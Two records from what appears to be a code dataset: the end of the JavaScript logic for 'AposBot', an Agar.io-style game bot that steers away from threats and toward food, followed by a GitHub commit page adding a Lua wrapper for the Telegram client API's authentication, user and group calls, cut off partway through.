u.getEdgeLinesFromPoint(blob1, blob2, radius);      var leftAngle = angleStuff[0];     var rightAngle = u.rangeToAngle(angleStuff);     var difference = angleStuff[1];      u.drawPoint(angleStuff[2][0], angleStuff[2][1], 3, """");     u.drawPoint(angleStuff[3][0], angleStuff[3][1], 3, """");      //console.log(""Adding badAngles: "" + leftAngle + "", "" + rightAngle + "" diff: "" + difference);      var lineLeft = u.followAngle(leftAngle, blob1.x, blob1.y, 150 + blob1.size - index * 10);     var lineRight = u.followAngle(rightAngle, blob1.x, blob1.y, 150 + blob1.size - index * 10);      if (blob2.isVirus()) {         u.drawLine(blob1.x, blob1.y, lineLeft[0], lineLeft[1], 6);         u.drawLine(blob1.x, blob1.y, lineRight[0], lineRight[1], 6);         u.drawArc(lineLeft[0], lineLeft[1], lineRight[0], lineRight[1], blob1.x, blob1.y, 6);     } else if(getCells().hasOwnProperty(blob2.id)) {         u.drawLine(blob1.x, blob1.y, lineLeft[0], lineLeft[1], 0);         u.drawLine(blob1.x, blob1.y, lineRight[0], lineRight[1], 0);         u.drawArc(lineLeft[0], lineLeft[1], lineRight[0], lineRight[1], blob1.x, blob1.y, 0);     } else {         u.drawLine(blob1.x, blob1.y, lineLeft[0], lineLeft[1], 3);         u.drawLine(blob1.x, blob1.y, lineRight[0], lineRight[1], 3);         u.drawArc(lineLeft[0], lineLeft[1], lineRight[0], lineRight[1], blob1.x, blob1.y, 3);     }      return [leftAngle, difference]; };  //Given a list of conditions, shift the angle to the closest available spot respecting the range given. u.shiftAngle = function(listToUse, angle, range) {     //TODO: shiftAngle needs to respect the range! DONE?     for (var i = 0; i < listToUse.length; i++) {         if (u.angleIsWithin(angle, listToUse[i])) {             //console.log(""Shifting needed!"");              var angle1 = listToUse[i][0];             var angle2 = u.rangeToAngle(listToUse[i]);              var dist1 = (angle - angle1).mod(360);             var dist2 = (angle2 - angle).mod(360);              if (dist1 < dist2) {                 if (u.angleIsWithin(angle1, range)) {                     return angle1;                 } else {                     return angle2;                 }             } else {                 if (u.angleIsWithin(angle2, range)) {                     return angle2;                 } else {                     return angle1;                 }             }         }     }     //console.log(""No Shifting Was needed!"");     return angle; };  /**  * This is the main bot logic. This is called quite often.  * @param  followMouse Is a boolean. If set to true, it means the user is asking for the bot to follow the mouse coordinates.  * @return A 2 dimensional array with coordinates for every cells.  [[x, y], [x, y]]  */ u.findDestination = function(followMouse) {     var player = getPlayer();     var interNodes = getMemoryCells();     //console.warn(""findDestination(followMouse) was called from line "" + arguments.callee.caller.toString());      if ( /*!toggle*/ 1) {          //The following code converts the mouse position into an         //absolute game coordinate.         var useMouseX = u.screenToGameX(getMouseX());         var useMouseY = u.screenToGameY(getMouseY());         tempPoint = [useMouseX, useMouseY, 1];          //The current destination that the cells were going towards.         var tempMoveX = getPointX();         var tempMoveY = getPointY();          //This variable will be returned at the end.         //It will contain the destination choices for all the cells.         //BTW!!! ERROR ERROR ABORT MISSION!!!!!!! READ BELOW -----------         //         //SINCE IT\'S STUPID NOW TO ASK EACH CELL WHERE THEY WANT TO GO,         //THE BOT SHOULD SIMPLY PICK ONE AND THAT\'S IT, I MEAN WTF....         var destinationChoices = []; //destination, size, danger          //Just to make sure the player is alive.         if (player.length > 0) {              //Loop through all the player\'s cells.             for (var k = 0; k < player.length; k++) {                 if (true) {                     u.drawPoint(player[k].x, player[k].y + player[k].size, 0, """" + (getLastUpdate() - player[k].birth) + "" / "" + (30000 + (player[k].birthMass * 57) - (getLastUpdate() - player[k].birth)) + "" / "" + player[k].birthMass);                 }             }               //Loops only for one cell for now.             for (var k = 0; /*k < player.length*/ k < 1; k++) {                  //console.log(""Working on blob: "" + k);                  u.drawCircle(player[k].x, player[k].y, player[k].size + u.splitDistance, 5);                 //drawPoint(player[0].x, player[0].y - player[0].size, 3, """" + Math.floor(player[0].x) + "", "" + Math.floor(player[0].y));                  //var allDots = processEverything(interNodes);                  //loop through everything that is on the screen and                 //separate everything in it\'s own category.                 var allIsAll = u.getAll(player[k]);                  //The food stored in element 0 of allIsAll                 var allPossibleFood = allIsAll[0];                 //The threats are stored in element 1 of allIsAll                 var allPossibleThreats = allIsAll[1];                 //The viruses are stored in element 2 of allIsAll                 var allPossibleViruses = allIsAll[2];                  //The bot works by removing angles in which it is too                 //dangerous to travel towards to.                 var badAngles = [];                 var obstacleList = [];                  var isSafeSpot = true;                 var isMouseSafe = true;                  var clusterAllFood = u.clusterFood(allPossibleFood, player[k].size);                  //console.log(""Looking for enemies!"");                  //Loop through all the cells that were identified as threats.                 for (var i = 0; i < allPossibleThreats.length; i++) {                      var enemyDistance = u.computeDistanceFromCircleEdge(allPossibleThreats[i].x, allPossibleThreats[i].y, player[k].x, player[k].y, allPossibleThreats[i].size);                      allPossibleThreats[i].enemyDist = enemyDistance;                 }                  /*allPossibleThreats.sort(function(a, b){                     return a.enemyDist-b.enemyDist;                 })*/                  for (var i = 0; i < allPossibleThreats.length; i++) {                      var enemyDistance = u.computeDistance(allPossibleThreats[i].x, allPossibleThreats[i].y, player[k].x, player[k].y);                      var splitDangerDistance = allPossibleThreats[i].size + u.splitDistance + 150;                      var normalDangerDistance = allPossibleThreats[i].size + 150;                      var shiftDistance = player[k].size;                      //console.log(""Found distance."");                      var enemyCanSplit = u.canSplit(player[k], allPossibleThreats[i]);                                          for (var j = clusterAllFood.length - 1; j >= 0 ; j--) {                         var secureDistance = (enemyCanSplit ? splitDangerDistance : normalDangerDistance);                         if (u.computeDistance(allPossibleThreats[i].x, allPossibleThreats[i].y, clusterAllFood[j][0], clusterAllFood[j][1]) < secureDistance)                             clusterAllFood.splice(j, 1);                     }                      //console.log(""Removed some food."");                      if (enemyCanSplit) {                         u.drawCircle(allPossibleThreats[i].x, allPossibleThreats[i].y, splitDangerDistance, 0);                         u.drawCircle(allPossibleThreats[i].x, allPossibleThreats[i].y, splitDangerDistance + shiftDistance, 6);                     } else {                         u.drawCircle(allPossibleThreats[i].x, allPossibleThreats[i].y, normalDangerDistance, 3);                         u.drawCircle(allPossibleThreats[i].x, allPossibleThreats[i].y, normalDangerDistance + shiftDistance, 6);                     }                      if (allPossibleThreats[i].danger && getLastUpdate() - allPossibleThreats[i].dangerTimeOut > 1000) {                          allPossibleThreats[i].danger = false;                     }                      /*if ((enemyCanSplit && enemyDistance < splitDangerDistance) ||                         (!enemyCanSplit && enemyDistance < normalDangerDistance)) {                         allPossibleThreats[i].danger = true;                         allPossibleThreats[i].dangerTimeOut = f.getLastUpdate();                     }*/                      //console.log(""Figured out who was important."");                      if ((enemyCanSplit && enemyDistance < splitDangerDistance) || (enemyCanSplit && allPossibleThreats[i].danger)) {                          badAngles.push(u.getAngleRange(player[k], allPossibleThreats[i], i, splitDangerDistance).concat(allPossibleThreats[i].enemyDist));                      } else if ((!enemyCanSplit && enemyDistance < normalDangerDistance) || (!enemyCanSplit && allPossibleThreats[i].danger)) {                          badAngles.push(u.getAngleRange(player[k], allPossibleThreats[i], i, normalDangerDistance).concat(allPossibleThreats[i].enemyDist));                      } else if (enemyCanSplit && enemyDistance < splitDangerDistance + shiftDistance) {                         var tempOb = u.getAngleRange(player[k], allPossibleThreats[i], i, splitDangerDistance + shiftDistance);                         var angle1 = tempOb[0];                         var angle2 = u.rangeToAngle(tempOb);                          obstacleList.push([[angle1, true], [angle2, false]]);                     } else if (!enemyCanSplit && enemyDistance < normalDangerDistance + shiftDistance) {                         var tempOb = u.getAngleRange(player[k], allPossibleThreats[i], i, normalDangerDistance + shiftDistance);                         var angle1 = tempOb[0];                         var angle2 = u.rangeToAngle(tempOb);                          obstacleList.push([[angle1, true], [angle2, false]]);                     }                     //console.log(""Done with enemy: "" + i);                 }                  //console.log(""Done looking for enemies!"");                  var goodAngles = [];                 var stupidList = [];                  for (var i = 0; i < allPossibleViruses.length; i++) {                     if (player[k].size < allPossibleViruses[i].size) {                         u.drawCircle(allPossibleViruses[i].x, allPossibleViruses[i].y, allPossibleViruses[i].size + 10, 3);                         u.drawCircle(allPossibleViruses[i].x, allPossibleViruses[i].y, allPossibleViruses[i].size * 2, 6);                      } else {                         u.drawCircle(allPossibleViruses[i].x, allPossibleViruses[i].y, player[k].size + 50, 3);                         u.drawCircle(allPossibleViruses[i].x, allPossibleViruses[i].y, player[k].size * 2, 6);                     }                 }                  for (var i = 0; i < allPossibleViruses.length; i++) {                     var virusDistance = u.computeDistance(allPossibleViruses[i].x, allPossibleViruses[i].y, player[k].x, player[k].y);                     if (player[k].size < allPossibleViruses[i].size) {                         if (virusDistance < (allPossibleViruses[i].size * 2)) {                             var tempOb = u.getAngleRange(player[k], allPossibleViruses[i], i, allPossibleViruses[i].size + 10);                             var angle1 = tempOb[0];                             var angle2 = u.rangeToAngle(tempOb);                             obstacleList.push([[angle1, true], [angle2, false]]);                         }                     } else {                         if (virusDistance < (player[k].size * 2)) {                             var tempOb = u.getAngleRange(player[k], allPossibleViruses[i], i, player[k].size + 50);                             var angle1 = tempOb[0];                             var angle2 = u.rangeToAngle(tempOb);                             obstacleList.push([[angle1, true], [angle2, false]]);                         }                     }                 }                  if (badAngles.length > 0) {                     //NOTE: This is only bandaid wall code. It\'s not the best way to do it.                     stupidList = u.addWall(stupidList, player[k]);                 }                  for (var i = 0; i < badAngles.length; i++) {                     var angle1 = badAngles[i][0];                     var angle2 = u.rangeToAngle(badAngles[i]);                     stupidList.push([[angle1, true], [angle2, false], badAngles[i][2]]);                 }                  //stupidList.push([[45, true], [135, false]]);                 //stupidList.push([[10, true], [200, false]]);                  stupidList.sort(function(a, b){                     //console.log(""Distance: "" + a[2] + "", "" + b[2]);                     return a[2]-b[2];                 });                  //console.log(""Added random noob stuff."");                  var sortedInterList = [];                 var sortedObList = [];                  for (var i = 0; i < stupidList.length; i++) {                     //console.log(""Adding to sorted: "" + stupidList[i][0][0] + "", "" + stupidList[i][1][0]);                     var tempList = u.addAngle(sortedInterList, stupidList[i]);                      if (tempList.length == 0) {                         console.log(""MAYDAY IT\'S HAPPENING!"");                         break;                     } else {                         sortedInterList = tempList;                     }                 }                  for (var i = 0; i < obstacleList.length; i++) {                     sortedObList = u.addAngle(sortedObList, obstacleList[i]);                      if (sortedObList.length == 0) {                         break;                     }                 }                  var offsetI = 0;                 var obOffsetI = 1;                  if (sortedInterList.length > 0 && sortedInterList[0][1]) {                     offsetI = 1;                 }                 if (sortedObList.length > 0 && sortedObList[0][1]) {                     obOffsetI = 0;                 }                  var goodAngles = [];                 var obstacleAngles = [];                  for (var i = 0; i < sortedInterList.length; i += 2) {                     var angle1 = sortedInterList[(i + offsetI).mod(sortedInterList.length)][0];                     var angle2 = sortedInterList[(i + 1 + offsetI).mod(sortedInterList.length)][0];                     var diff = (angle2 - angle1).mod(360);                     goodAngles.push([angle1, diff]);                 }                  for (var i = 0; i < sortedObList.length; i += 2) {                     var angle1 = sortedObList[(i + obOffsetI).mod(sortedObList.length)][0];                     var angle2 = sortedObList[(i + 1 + obOffsetI).mod(sortedObList.length)][0];                     var diff = (angle2 - angle1).mod(360);                     obstacleAngles.push([angle1, diff]);                 }                  for (var i = 0; i < goodAngles.length; i++) {                     var line1 = u.followAngle(goodAngles[i][0], player[k].x, player[k].y, 100 + player[k].size);                     var line2 = u.followAngle((goodAngles[i][0] + goodAngles[i][1]).mod(360), player[k].x, player[k].y, 100 + player[k].size);                     u.drawLine(player[k].x, player[k].y, line1[0], line1[1], 1);                     u.drawLine(player[k].x, player[k].y, line2[0], line2[1], 1);                      u.drawArc(line1[0], line1[1], line2[0], line2[1], player[k].x, player[k].y, 1);                      //drawPoint(player[0].x, player[0].y, 2, """");                      u.drawPoint(line1[0], line1[1], 0, """" + i + "": 0"");                     u.drawPoint(line2[0], line2[1], 0, """" + i + "": 1"");                 }                  for (var i = 0; i < obstacleAngles.length; i++) {                     var line1 = u.followAngle(obstacleAngles[i][0], player[k].x, player[k].y, 50 + player[k].size);                     var line2 = u.followAngle((obstacleAngles[i][0] + obstacleAngles[i][1]).mod(360), player[k].x, player[k].y, 50 + player[k].size);                     u.drawLine(player[k].x, player[k].y, line1[0], line1[1], 6);                     u.drawLine(player[k].x, player[k].y, line2[0], line2[1], 6);                      u.drawArc(line1[0], line1[1], line2[0], line2[1], player[k].x, player[k].y, 6);                      //drawPoint(player[0].x, player[0].y, 2, """");                      u.drawPoint(line1[0], line1[1], 0, """" + i + "": 0"");                     u.drawPoint(line2[0], line2[1], 0, """" + i + "": 1"");                 }                  if (followMouse && goodAngles.length == 0) {                     //This is the follow the mouse mode                     var distance = u.computeDistance(player[k].x, player[k].y, tempPoint[0], tempPoint[1]);                      var shiftedAngle = u.shiftAngle(obstacleAngles, u.getAngle(tempPoint[0], tempPoint[1], player[k].x, player[k].y), [0, 360]);                      var destination = u.followAngle(shiftedAngle, player[k].x, player[k].y, distance);                      destinationChoices = destination;                     u.drawLine(player[k].x, player[k].y, destination[0], destination[1], 1);                     //tempMoveX = destination[0];                     //tempMoveY = destination[1];                  } else if (goodAngles.length > 0) {                     var bIndex = goodAngles[0];                     var biggest = goodAngles[0][1];                     for (var i = 1; i < goodAngles.length; i++) {                         var size = goodAngles[i][1];                         if (size > biggest) {                             biggest = size;                             bIndex = goodAngles[i];                         }                     }                     var perfectAngle = (bIndex[0] + bIndex[1] / 2).mod(360);                      perfectAngle = u.shiftAngle(obstacleAngles, perfectAngle, bIndex);                      var line1 = u.followAngle(perfectAngle, player[k].x, player[k].y, verticalDistance());                      destinationChoices = line1;                     u.drawLine(player[k].x, player[k].y, line1[0], line1[1], 7);                     //tempMoveX = line1[0];                     //tempMoveY = line1[1];                 } else if (badAngles.length > 0 && goodAngles == 0) {                     //When there are enemies around but no good angles                     //You\'re likely screwed. (This should never happen.)                      console.log(""Failed"");                     destinationChoices = [tempMoveX, tempMoveY];                     /*var angleWeights = [] //Put weights on the angles according to enemy distance                     for (var i = 0; i < allPossibleThreats.length; i++){                         var dist = computeDistance(player[k].x, player[k].y, allPossibleThreats[i].x, allPossibleThreats[i].y);                         var angle = getAngle(allPossibleThreats[i].x, allPossibleThreats[i].y, player[k].x, player[k].y);                         angleWeights.push([angle,dist]);                     }                     var maxDist = 0;                     var finalAngle = 0;                     for (var i = 0; i < angleWeights.length; i++){                         if (angleWeights[i][1] > maxDist){                             maxDist = angleWeights[i][1];                             finalAngle = (angleWeights[i][0] + 180).mod(360);                         }                     }                     var line1 = followAngle(finalAngle,player[k].x,player[k].y,f.verticalDistance());                     drawLine(player[k].x, player[k].y, line1[0], line1[1], 2);                     destinationChoices.push(line1);*/                 } else if (clusterAllFood.length > 0) {                     for (var i = 0; i < clusterAllFood.length; i++) {                         //console.log(""mefore: "" + clusterAllFood[i][2]);                         //This is the cost function. Higher is better.                              var clusterAngle = u.getAngle(clusterAllFood[i][0], clusterAllFood[i][1], player[k].x, player[k].y);                              clusterAllFood[i][2] = clusterAllFood[i][2] * 6 - u.computeDistance(clusterAllFood[i][0], clusterAllFood[i][1], player[k].x, player[k].y);                             //console.log(""Current Value: "" + clusterAllFood[i][2]);                              //(goodAngles[bIndex][1] / 2 - (Math.abs(perfectAngle - clusterAngle)));                              clusterAllFood[i][3] = clusterAngle;                              u.drawPoint(clusterAllFood[i][0], clusterAllFood[i][1], 1, """");                             //console.log(""After: "" + clusterAllFood[i][2]);                     }                      var bestFoodI = 0;                     var bestFood = clusterAllFood[0][2];                     for (var i = 1; i < clusterAllFood.length; i++) {                         if (bestFood < clusterAllFood[i][2]) {                             bestFood = clusterAllFood[i][2];                             bestFoodI = i;                         }                     }                      //console.log(""Best Value: "" + clusterAllFood[bestFoodI][2]);                      var distance = u.computeDistance(player[k].x, player[k].y, clusterAllFood[bestFoodI][0], clusterAllFood[bestFoodI][1]);                      var shiftedAngle = u.shiftAngle(obstacleAngles, u.getAngle(clusterAllFood[bestFoodI][0], clusterAllFood[bestFoodI][1], player[k].x, player[k].y), [0, 360]);                      var destination = u.followAngle(shiftedAngle, player[k].x, player[k].y, distance);                      destinationChoices = destination;                     //tempMoveX = destination[0];                     //tempMoveY = destination[1];                     u.drawLine(player[k].x, player[k].y, destination[0], destination[1], 1);                 } else {                     //If there are no enemies around and no food to eat.                     destinationChoices = [tempMoveX, tempMoveY];                 }                  u.drawPoint(tempPoint[0], tempPoint[1], tempPoint[2], """");                 //drawPoint(tempPoint[0], tempPoint[1], tempPoint[2], """" + Math.floor(computeDistance(tempPoint[0], tempPoint[1], I, J)));                 //drawLine(tempPoint[0], tempPoint[1], player[0].x, player[0].y, 6);                 //console.log(""Slope: "" + slope(tempPoint[0], tempPoint[1], player[0].x, player[0].y) + "" Angle: "" + getAngle(tempPoint[0], tempPoint[1], player[0].x, player[0].y) + "" Side: "" + (getAngle(tempPoint[0], tempPoint[1], player[0].x, player[0].y) - 90).mod(360));                 tempPoint[2] = 1;                  //console.log(""Done working on blob: "" + i);             }              //TODO: Find where to go based on destinationChoices.             /*var dangerFound = false;             for (var i = 0; i < destinationChoices.length; i++) {                 if (destinationChoices[i][2]) {                     dangerFound = true;                     break;                 }             }             destinationChoices.sort(function(a, b){return b[1] - a[1]});             if (dangerFound) {                 for (var i = 0; i < destinationChoices.length; i++) {                     if (destinationChoices[i][2]) {                         tempMoveX = destinationChoices[i][0][0];                         tempMoveY = destinationChoices[i][0][1];                         break;                     }                 }             } else {                 tempMoveX = destinationChoices.peek()[0][0];                 tempMoveY = destinationChoices.peek()[0][1];                 //console.log(""Done "" + tempMoveX + "", "" + tempMoveY);             }*/         }         //console.log(""MOVING RIGHT NOW!"");          //console.log(""______Never lied ever in my life."");          return destinationChoices;     } };  /**  * A conversion from the screen\'s horizontal coordinate system  * to the game\'s horizontal coordinate system.  * @param x in the screen\'s coordinate system  * @return x in the game\'s coordinate system  */ u.screenToGameX = function(x) {     return (x - getWidth() / 2) / getRatio() + getX(); };  /**  * A conversion from the screen\'s vertical coordinate system  * to the game\'s vertical coordinate system.  * @param y in the screen\'s coordinate system  * @return y in the game\'s coordinate system  */ u.screenToGameY = function(y) {     return (y - getHeight() / 2) / getRatio() + getY(); };  u.drawPoint = function(x_1, y_1, drawColor, text) {     f.drawPoint(x_1, y_1, drawColor, text); };  u.drawArc = function(x_1, y_1, x_2, y_2, x_3, y_3, drawColor) {     f.drawArc(x_1, y_1, x_2, y_2, x_3, y_3, drawColor); };  u.drawLine = function(x_1, y_1, x_2, y_2, drawColor) {     f.drawLine(x_1, y_1, x_2, y_2, drawColor); };  u.drawCircle = function(x_1, y_1, radius, drawColor) {     f.drawCircle(x_1, y_1, radius, drawColor); };  /**  * Some horse shit of some sort.  * @return Horse Shit  */ u.screenDistance = function() {     var temp = f.getScreenDistance();     return temp; };  /**  * Tells you if the game is in Dark mode.  * @return Boolean for dark mode.  */ u.getDarkBool = function() {     return f.getDarkBool(); };  /**  * Tells you if the mass is shown.  * @return Boolean for player\'s mass.  */ u.getMassBool = function() {     return f.getMassBool(); };  /**  * This is a copy of everything that is shown on screen.  * Normally stuff will time out when off the screen, this  * memorizes everything that leaves the screen for a little  * while longer.  * @return The memory object.  */ u.getMemoryCells = function() {     return f.getMemoryCells(); };  /**  * [getCellsArray description]  * @return {[type]} [description]  */ u.getCellsArray = function() {     return f.getCellsArray(); };  /**  * This is the original ""getMemoryCells"" without the memory part.  * @return Non memorized object.  */ u.getCells = function() {     return f.getCells(); };  /**  * Returns an array with all the player\'s cells.  * @return Player\'s cells  */ u.getPlayer = function () {     return f.getPlayer(); };  /**  * The canvas\' width.  * @return Integer Width  */ u.getWidth = function() {     return f.getWidth(); };  /**  * The canvas\' height  * @return Integer Height  */ u.getHeight = function() {     return f.getHeight(); };  /**  * Scaling ratio of the canvas. The bigger this ration,  * the further that you see.  * @return Screen scaling ratio.  */ u.getRatio = function() {     return f.getRatio(); };  /**  * [getOffsetX description]  * @return {[type]} [description]  */ u.getOffsetX = function() {     return f.getOffsetX(); };  u.getOffsetY = function() {     return f.getOffsetY(); };  u.getX = function() {     return f.getX(); };  u.getY = function() {     return f.getY(); };  u.getPointX = function() {     return f.getPointX(); };  u.getPointY = function() {     return f.getPointY(); };  /**  * The X location of the mouse.  * @return Integer X  */ u.getMouseX = function() {     return f.getMouseX(); };  /**  * The Y location of the mouse.  * @return Integer Y  */ u.getMouseY = function() {     return f.getMouseY(); };  /**  * A timestamp since the last time the server sent any data.  * @return Last update timestamp  */ u.getUpdate = function() {     return f.getLastUpdate(); };  /**  * The game\'s current mode. ("":ffa"", "":experimental"", "":teams"". "":party"")  * @return {[type]} [description]  */ u.getMode = function() {     return f.getMode(); };  f.botList.push([""AposBot "" + aposBotVersion, u.findDestination]);  u.bList = g(\'#bList\'); g(\'<option />\', {value: (f.botList.length - 1), text: ""AposBot""}).appendTo(bList);",,2
0,https://github.com/arashstar1/bot-lua.git,"Code  Issues 0  Pull requests 0  Pulse  MaTaDoR/ 3233fdf V 5.7 MaTaDoR @MaTaDoRTeaMMaTaDoRTeaM committed on GitHub about 1 month ago 2 changed files 2,704 additions and 0 deletions cli/tg/tdcli.lua @@ -0,0 +1,2704 @@ +--[[ +   This program is free software; you can redistribute it and/or modify +   it under the terms of the GNU General Public License as published by +   the Free Software Foundation; either version 2 of the License, or +   (at your option) any later version. + +   This program is distributed in the hope that it will be useful, +   but WITHOUT ANY WARRANTY; without even the implied warranty of +   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the +   GNU General Public License for more details. + +   You should have received a copy of the GNU General Public License +   along with this program; if not, write to the Free Software +   Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, +   MA 02110-1301, USA. + +]]-- + +-- Vector example form is like this: {[0] = v} or {v1, v2, v3, [0] = v} +-- If false or true crashed your telegram-cli, try to change true to 1 and false to 0 + +-- Main Bot Framework +local M = {} + +-- @chat_id = user, group, channel, and broadcast +-- @group_id = normal group +-- @channel_id = channel and broadcast +local function getChatId(chat_id) +  local chat = {} +  local chat_id = tostring(chat_id) + +  if chat_id:match(\'^-100\') then +    local channel_id = chat_id:gsub(\'-100\', \'\') +    chat = {ID = channel_id, type = \'channel\ +  else +    local group_id = chat_id:gsub(\'-\', \'\') +    chat = {ID = group_id, type = \'group\ +  end + +  return chat +end + +local function getInputFile(file) +  if file:match(\'/\') then +    infile = {ID = ""InputFileLocal"", path_ = file} +  elseif file:match(\'^%d+$\') then +    infile = {ID = ""InputFileId"", id_ = file} +  else +    infile = {ID = ""InputFilePersistentId"", persistent_id_ = file} +  end + +  return infile +end + +-- User can send bold, italic, and monospace text uses HTML or Markdown format. +local function getParseMode(parse_mode) +  if parse_mode then +    local mode = parse_mode:lower() + +    if mode == \'markdown\' or mode == \'md\' then +      P = {ID = ""TextParseModeMarkdown""} +    elseif mode == \'html\' then +      P = {ID = ""TextParseModeHTML""} +    end +  end + +  return P +end + +-- Returns current authorization state, offline request +local function getAuthState(dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetAuthState"", +  }, dl_cb, cmd) +end + +M.getAuthState = getAuthState + +-- Sets user\'s phone number and sends authentication code to the user. +-- Works only when authGetState returns authStateWaitPhoneNumber. +-- If phone number is not recognized or another error has happened, returns an error. Otherwise returns authStateWaitCode +-- @phone_number User\'s phone number in any reasonable format +-- @allow_flash_call Pass True, if code can be sent via flash call to the specified phone number +-- @is_current_phone_number Pass true, if the phone number is used on the current device. Ignored if allow_flash_call is False +local function setAuthPhoneNumber(phone_number, allow_flash_call, is_current_phone_number, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SetAuthPhoneNumber"", +    phone_number_ = phone_number, +    allow_flash_call_ = allow_flash_call, +    is_current_phone_number_ = is_current_phone_number +  }, dl_cb, cmd) +end + +M.setAuthPhoneNumber = setAuthPhoneNumber + +-- Resends authentication code to the user. +-- Works only when authGetState returns authStateWaitCode and next_code_type of result is not null. +-- Returns authStateWaitCode on success +local function resendAuthCode(dl_cb, cmd) +  tdcli_function ({ +    ID = ""ResendAuthCode"", +  }, dl_cb, cmd) +end + +M.resendAuthCode = resendAuthCode + +-- Checks authentication code. +-- Works only when authGetState returns authStateWaitCode. +-- Returns authStateWaitPassword or authStateOk on success +-- @code Verification code from SMS, Telegram message, voice call or flash call +-- @first_name User first name, if user is yet not registered, 1-255 characters +-- @last_name Optional user last name, if user is yet not registered, 0-255 characters +local function checkAuthCode(code, first_name, last_name, dl_cb, cmd) +  tdcli_function ({ +    ID = ""CheckAuthCode"", +    code_ = code, +    first_name_ = first_name, +    last_name_ = last_name +  }, dl_cb, cmd) +end + +M.checkAuthCode = checkAuthCode + +-- Checks password for correctness. +-- Works only when authGetState returns authStateWaitPassword. +-- Returns authStateOk on success +-- @password Password to check +local function checkAuthPassword(password, dl_cb, cmd) +  tdcli_function ({ +    ID = ""CheckAuthPassword"", +    password_ = password +  }, dl_cb, cmd) +end + +M.checkAuthPassword = checkAuthPassword + +-- Requests to send password recovery code to email. +-- Works only when authGetState returns authStateWaitPassword. +-- Returns authStateWaitPassword on success +local function requestAuthPasswordRecovery(dl_cb, cmd) +  tdcli_function ({ +    ID = ""RequestAuthPasswordRecovery"", +  }, dl_cb, cmd) +end + +M.requestAuthPasswordRecovery = requestAuthPasswordRecovery + +-- Recovers password with recovery code sent to email. +-- Works only when authGetState returns authStateWaitPassword. +-- Returns authStateOk on success +-- @recovery_code Recovery code to check +local function recoverAuthPassword(recovery_code, dl_cb, cmd) +  tdcli_function ({ +    ID = ""RecoverAuthPassword"", +    recovery_code_ = recovery_code +  }, dl_cb, cmd) +end + +M.recoverAuthPassword = recoverAuthPassword + +-- Logs out user. +-- If force == false, begins to perform soft log out, returns authStateLoggingOut after completion. +-- If force == true then succeeds almost immediately without cleaning anything at the server, but returns error with code 401 and description ""Unauthorized"" +-- @force If true, just delete all local data. Session will remain in list of active sessions +local function resetAuth(force, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ResetAuth"", +    force_ = force or nil +  }, dl_cb, cmd) +end + +M.resetAuth = resetAuth + +-- Check bot\'s authentication token to log in as a bot. +-- Works only when authGetState returns authStateWaitPhoneNumber. +-- Can be used instead of setAuthPhoneNumber and checkAuthCode to log in. +-- Returns authStateOk on success +-- @token Bot token +local function checkAuthBotToken(token, dl_cb, cmd) +  tdcli_function ({ +    ID = ""CheckAuthBotToken"", +    token_ = token +  }, dl_cb, cmd) +end + +M.checkAuthBotToken = checkAuthBotToken + +-- Returns current state of two-step verification +local function getPasswordState(dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetPasswordState"", +  }, dl_cb, cmd) +end + +M.getPasswordState = getPasswordState + +-- Changes user password. +-- If new recovery email is specified, then error EMAIL_UNCONFIRMED is returned and password change will not be applied until email confirmation. +-- Application should call getPasswordState from time to time to check if email is already confirmed +-- @old_password Old user password +-- @new_password New user password, may be empty to remove the password +-- @new_hint New password hint, can be empty +-- @set_recovery_email Pass True, if recovery email should be changed +-- @new_recovery_email New recovery email, may be empty +local function setPassword(old_password, new_password, new_hint, set_recovery_email, new_recovery_email, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SetPassword"", +    old_password_ = old_password, +    new_password_ = new_password, +    new_hint_ = new_hint, +    set_recovery_email_ = set_recovery_email, +    new_recovery_email_ = new_recovery_email +  }, dl_cb, cmd) +end + +M.setPassword = setPassword + +-- Returns set up recovery email. +-- This method can be used to verify a password provided by the user +-- @password Current user password +local function getRecoveryEmail(password, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetRecoveryEmail"", +    password_ = password +  }, dl_cb, cmd) +end + +M.getRecoveryEmail = getRecoveryEmail + +-- Changes user recovery email. +-- If new recovery email is specified, then error EMAIL_UNCONFIRMED is returned and email will not be changed until email confirmation. +-- Application should call getPasswordState from time to time to check if email is already confirmed. +-- If new_recovery_email coincides with the current set up email succeeds immediately and aborts all other requests waiting for email confirmation +-- @password Current user password +-- @new_recovery_email New recovery email +local function setRecoveryEmail(password, new_recovery_email, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SetRecoveryEmail"", +    password_ = password, +    new_recovery_email_ = new_recovery_email +  }, dl_cb, cmd) +end + +M.setRecoveryEmail = setRecoveryEmail + +-- Requests to send password recovery code to email +local function requestPasswordRecovery(dl_cb, cmd) +  tdcli_function ({ +    ID = ""RequestPasswordRecovery"", +  }, dl_cb, cmd) +end + +M.requestPasswordRecovery = requestPasswordRecovery + +-- Recovers password with recovery code sent to email +-- @recovery_code Recovery code to check +local function recoverPassword(recovery_code, dl_cb, cmd) +  tdcli_function ({ +    ID = ""RecoverPassword"", +    recovery_code_ = tostring(recovery_code) +  }, dl_cb, cmd) +end + +M.recoverPassword = recoverPassword + +-- Returns current logged in user +local function getMe(dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetMe"", +  }, dl_cb, cmd) +end + +M.getMe = getMe + +-- Returns information about a user by its identifier, offline request if current user is not a bot +-- @user_id User identifier +local function getUser(user_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetUser"", +    user_id_ = user_id +  }, dl_cb, cmd) +end + +M.getUser = getUser + +-- Returns full information about a user by its identifier +-- @user_id User identifier +local function getUserFull(user_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetUserFull"", +    user_id_ = user_id +  }, dl_cb, cmd) +end + +M.getUserFull = getUserFull + +-- Returns information about a group by its identifier, offline request if current user is not a bot +-- @group_id Group identifier +local function getGroup(group_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetGroup"", +    group_id_ = getChatId(group_id).ID +  }, dl_cb, cmd) +end + +M.getGroup = getGroup + +-- Returns full information about a group by its identifier +-- @group_id Group identifier +local function getGroupFull(group_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetGroupFull"", +    group_id_ = getChatId(group_id).ID +  }, dl_cb, cmd) +end + +M.getGroupFull = getGroupFull + +-- Returns information about a channel by 